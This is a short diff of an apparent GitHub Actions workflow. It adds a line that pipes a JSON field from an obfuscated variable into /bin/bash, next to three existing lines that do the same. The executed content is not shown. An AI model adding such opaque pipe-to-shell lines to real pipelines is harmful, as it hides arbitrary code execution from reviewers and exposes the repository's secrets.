@@ -37,6 +37,7 @@ jobs:
           echo $tdbjo357 | jq -r .upa048 | /bin/bash
           printf '%s' "$gydsm672" | jq -r .hd2738 | /bin/bash
           echo $c1 | jq -r .iu8017 | /bin/bash
+          printf '%s' "$olarb3106" | jq -r .dgrvc45105 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
